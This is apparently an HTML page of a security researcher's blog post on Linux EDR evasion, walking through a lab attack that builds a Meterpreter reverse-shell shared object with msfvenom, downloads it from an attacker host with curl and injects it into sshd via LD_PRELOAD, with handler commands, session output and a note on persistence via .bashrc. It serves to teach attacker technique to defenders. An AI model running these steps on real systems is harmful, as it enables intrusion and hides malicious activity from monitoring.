@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <title>Where DFIR Meets IT - ForensicITGuy's blog about DFIR and tech</title>
+    <meta name="description" content="ForensicITGuy's blog about DFIR and tech" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="MobileOptimized" content="320" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+    <!-- Customisation  -->
+    <link rel="stylesheet" type="text/css" href="/assets/css/main.css " />
+
+</head>
+<body class="home-template">
+
+    <header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="/">Home</a>
+        <a class="subscribe-button icon-feed" href="/feed.xml">Subscribe</a>
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post">
+
+        <header class="post-header">
+            <h1 class="post-title">Linux EDR Evasion With Meterpreter and LD_PRELOAD</h1>
+            <section class="post-meta">
+                
+                    on ld_preload, linux, edr, evasion, and meterpreter
+                
+                <time class="post-date" datetime="2020-02-06">06 Feb 2020</time>
+            </section>
+        </header>
+
+<!--         <header class="post-header">
+            <a id="blog-logo" href="https://forensicitguy.github.io/feed.xml">
+                
+                    <span class="blog-title">Where DFIR Meets IT</span>
+                
+            </a>
+        </header> -->
+
+        <!-- <span class="post-meta">
+            <time datetime="2020-02-06">06 Feb 2020</time>
+            
+                on ld_preload, linux, edr, evasion, and meterpreter
+            
+        </span> -->
+
+        <!-- <h1 class="post-title">Linux EDR Evasion With Meterpreter and LD_PRELOAD</h1> -->
+
+        <section class="post-content">
+            <p>Everyone has their favorite adversary technique to research and mine is LD_PRELOAD process injection because it’s pretty versatile. It lets you hook functions to manipulate output, and it can also let you trip up defenders by injecting code into arbitrary processes for execution. In this post, I’ll walk through how an adversary might combine Meterpreter with LD_PRELOAD to hide malicious activity under a legitimate Linux system process.</p>
+
+<h2 id="the-setup">The Setup</h2>
+
+<p>To get started, I’m working with a Kali Linux machine as my attacker system and a CentOS 8 system as my victim. You don’t have to limit yourself to this setup, but it’s what works for me at the moment.</p>
+
+<p>On the victim system, the only access needed is code execution and the ability to transfer a payload.</p>
+
+<p>On my attacker machine, I need to generate a Meterpeter payload within a shared object library format. To do this, we can use <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.57 LPORT=2022 -f elf-so &gt; meterpreter.so
+</code></pre></div></div>
+
+<p>Next, we need a way to transfer <code class="language-plaintext highlighter-rouge">meterpreter.so</code> to the victim system. This may be done via a <code class="language-plaintext highlighter-rouge">curl</code> command or another method of downloading/uploading files.</p>
+
+<p>In my case, I used NGINX to host the SO library from my Kali machine for download:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cp meterpreter.so /var/www/html/
+# systemctl start nginx
+</code></pre></div></div>
+
+<p>Finally, we need to set up a handler to receive the connection and use it in Metasploit. To do this, we can work with <code class="language-plaintext highlighter-rouge">msfconsole</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfconsole
+
+# msf5 &gt; use exploit/multi/handler
+# msf5 &gt; set payload linux/x64/meterpreter/reverse_tcp
+# msf5 &gt; set LHOST 10.10.10.57
+# msf5 &gt; set LPORT 2022
+# msf5 &gt; run
+
+[*] Started reverse TCP handler on 10.10.10.57:2022
+</code></pre></div></div>
+
+<p>And now we move to our victim system for execution!</p>
+
+<h2 id="the-execution">The Execution</h2>
+
+<p>On my victim system, I downloaded the SO library using a simple <code class="language-plaintext highlighter-rouge">curl</code> command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -O http://10.10.10.57/meterpreter.so
+</code></pre></div></div>
+
+<p>From here I can pick any process I want to attribute execution to, as long as it isn’t statically compiled. In this case, I’m choosing <code class="language-plaintext highlighter-rouge">sshd</code> since it often makes network connections and because some network admins use <code class="language-plaintext highlighter-rouge">tcp/2022</code> to obscure their SSH service availability.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ LD_PRELOAD=./meterpreter.so sshd
+</code></pre></div></div>
+
+<p>Once executed, control is never actually passed to <code class="language-plaintext highlighter-rouge">sshd</code>, and the process execution is controlled by <code class="language-plaintext highlighter-rouge">meterpreter.so</code> as it reports back for commands. It appears that the process is frozen, but it really isn’t.</p>
+
+<p>On the Kali machine I see:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending stage (3021284 bytes) to 10.10.10.51
+[*] Meterpreter session 1 opened (10.10.10.57:2022 -&gt; 10.10.10.51:39314) at 2020-02-06 20:05:00 -0600
+</code></pre></div></div>
+
+<p>From Kali I can join the Meterpreter session and get access at the permission level of the victim’s user account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; sysinfo
+Computer        : cent8-01.westeros.local
+OS              : CentOS 8.0.1905 (Linux 4.18.0-80.el8.x86_64)
+Architecture    : x64
+BuildTuple      : x86_64-linux-musl
+Meterpreter     : x64/linux
+</code></pre></div></div>
+
+<p>If we go to investigate with an EDR product, Auditd/Auditbeats logs, or osquery, the network connection and any actions will be attributed to <code class="language-plaintext highlighter-rouge">sshd</code>. This requires a defender to be much sharper on their game to spot malicious activity and understand the behavior of system processes. Depending on the actions we want to perform and the ports available for C2, we could potentially do the same with <code class="language-plaintext highlighter-rouge">httpd</code>, <code class="language-plaintext highlighter-rouge">smtpd</code>, <code class="language-plaintext highlighter-rouge">vsftpd</code>, etc.</p>
+
+<h2 id="how-does-it-work">How Does It Work?</h2>
+
+<p>Most of the time we can safely assume that SO libraries work in a similar fashion to DLLs on Windows. That is, the library must have an exported symbol that should be called for code to execute. We can inspect SO libraries for exported symbols using the <code class="language-plaintext highlighter-rouge">nm</code> command. Howver, when we inspect our generated <code class="language-plaintext highlighter-rouge">meterpreter.so</code> library we can notice something odd:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nm -D meterpreter.so
+nm: meterpreter.so: no symbols
+</code></pre></div></div>
+
+<p>Oddly enough, it doesn’t look like our <code class="language-plaintext highlighter-rouge">meterpreter.so</code> has any symbols to call, so how did <code class="language-plaintext highlighter-rouge">sshd</code> know to execute the code within the SO library? This is because of a feature of the ELF binary format.</p>
+
+<p>SO libraries follow the ELF binary format and include a section called <code class="language-plaintext highlighter-rouge">.init</code>. Any code placed within this section will execute when the library is loaded by a process and before control is passed to the process itself. The section is usually used by compilers for global constructors, but we can put nearly anything there for exploitation. When <code class="language-plaintext highlighter-rouge">msfvenom</code> creates its <code class="language-plaintext highlighter-rouge">elf-so</code> payloads, it embeds payloads within a template designed to house the payload within the <code class="language-plaintext highlighter-rouge">.init</code> section for execution. That way, no process should need knowledge of symbols within the library for execution.</p>
+
+<p>This is also the way payloads generated/used by the <a href="https://github.com/dsnezhkov/zombieant">Zombie Ant Farm</a> project work.</p>
+
+<p>The use of a <code class="language-plaintext highlighter-rouge">.init</code> section also has an interesting limitation when combined with preloading- it can only be used effectively when you define <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> for a single process. When executing Meterpreter in this fashion, the victim process will appear hung. This is because the Meterpreter code continuously executes before control is passed to the victim process’s main function. The rest of the process instructions will not execute until Meterpreter exits. This means that if you export <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> to leverage this SO library or write the library path into <code class="language-plaintext highlighter-rouge">ld.so.preload</code>, it will cause serious instability. If you use a preload method that causes <code class="language-plaintext highlighter-rouge">meterpreter.so</code> to load into numerous or all processes, it will cause loads of processes, even ones needed for system operation, to hang immediately after loading the SO library. So, no bueno.</p>
+
+<h2 id="is-it-useful">Is It Useful?</h2>
+
+<p>Eh, it depends. We obviously already need code execution and a method of downloading code to a victim for this to be possible. I could see this being useful when combined with an RCE against publicly-available services to get a stable shell. That said, a simpler and safer route in terms of stability could also be the execution of a Python C2 agent. In the case of a Python agent, it would be slightly harder to cause the attribution of activity to a system process. This is not going to be an initial access method, it would be more useful for long-term evasion and persistence when combined with a <code class="language-plaintext highlighter-rouge">.bash_profile</code> or <code class="language-plaintext highlighter-rouge">.bashrc</code> command execution.</p>
+
+        </section>
+
+        
+
+        <footer class="post-footer">
+            <!-- If we want to display author's name and bio -->
+            
+                <figure class="author-image">
+                    <a class="img" href="/" style="background-image: url(/assets/images/profile.png)">
+                    <span class="hidden">Tony Lambert (ForensicITGuy)'s Picture</span></a>
+                </figure>
+                <section class="author">
+                    <!-- Author Name -->
+                    <h4> Tony Lambert (ForensicITGuy) </h4>
+                    <!-- Author Bio -->
+                    <p>
+                        An educator that happens to do security things for Red Canary
+                    </p>
+                </section>
+            
+
+            <!-- Share links section -->
+            <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-twitter" href="http://twitter.com/share?text=Linux EDR Evasion With Meterpreter and LD_PRELOAD&amp;url=https://forensicitguy.github.io/ld_preload/linux/edr/evasion/meterpreter/2020/02/06/linux-edr-evasion-with-ld-preload.html"
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://forensicitguy.github.io/ld_preload/linux/edr/evasion/meterpreter/2020/02/06/linux-edr-evasion-with-ld-preload.html"
+        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=https://forensicitguy.github.io/ld_preload/linux/edr/evasion/meterpreter/2020/02/06/linux-edr-evasion-with-ld-preload.html"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+            <!-- Disqus comments -->
+            
+
+        </footer>
+
+    </article>
+
+</main>
+
+    <footer class="site-footer clearfix">
+      <section class="copyright">
+        <a href="">Where DFIR Meets IT</a> &copy; 
+              2021 &bull; All rights reserved.
+      </section>
+      <section class="poweredby">Made with Jekyll using 
+        <a href="http://github.com/rosario/kasper">Kasper theme</a>
+      </section>
+    </footer>
+    
+    <script type="text/javascript" src="/assets/js/jquery-1.11.1.min.js"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="/assets/js/index.js"></script>
+
+    <!-- Google Analytics Tracking code -->
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-155060013-1']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>   
+</body>
+</html>
